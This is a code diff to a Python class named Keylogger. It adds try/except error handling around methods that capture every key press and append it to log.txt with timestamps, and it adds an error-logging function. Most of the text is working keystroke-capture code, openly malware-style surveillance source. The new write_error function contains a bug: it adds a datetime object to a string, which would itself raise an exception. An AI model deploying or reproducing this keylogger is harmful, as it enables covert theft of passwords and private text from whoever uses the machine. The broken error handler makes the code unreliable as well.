@@ -17,39 +17,48 @@ class Keylogger:
 
     def on_press(self, key):
         # print(f'{key} pressed')
+        try:
+            for i in buttons:
+                if str(key) == i:
+                    break
 
-        for i in buttons:
-            if str(key) == i:
-                break
-
-        else:
-            self.write_file(key)
-
+            else:
+                self.write_file(key)
+        except Exception as er:
+            write_error(er)
 
     def write_file(self, key):
-        # print(self.count)
-            # print(self.keys)
-        with open('log.txt', 'a+', encoding=encoding) as file:
-            k = str(key).replace("'", "")
-            # print(k)
-            if k.find("backspace") > 0:
-                file.write('DELETE ')
+        try:
+            with open('log.txt', 'a+', encoding=encoding) as file:
+                k = str(key).replace("'", "")
 
-            elif k.find("space") > 0:
-                file.write(" ")
+                if k.find("backspace") > 0:
+                    file.write('DELETE ')
 
-            elif k.find("enter") > 0:
-                file.write('\n')
+                elif k.find("space") > 0:
+                    file.write(" ")
 
-            elif k.find("Key") == -1:
-                file.write(k)
+                elif k.find("enter") > 0:
+                    file.write('\n')
 
-            file.flush()
+                elif k.find("Key") == -1:
+                    file.write(k)
+
+                file.flush()
+        except Exception as er:
+            write_error(er)
 
     def write_time(self):
-        with open('log.txt', 'a+', encoding=encoding) as file:
-            file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')
+        try:
+            with open('log.txt', 'a+', encoding=encoding) as file:
+                file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')
+        except Exception as er:
+            write_error(er)
 
+
+def write_error(er):
+    with open('errors.txt', 'a+')as file:
+        file.write('\n' + str(datetime.datetime.now() + ':   ' + str(er)))
 
 if __name__ == "__main__":
     obj = Keylogger()
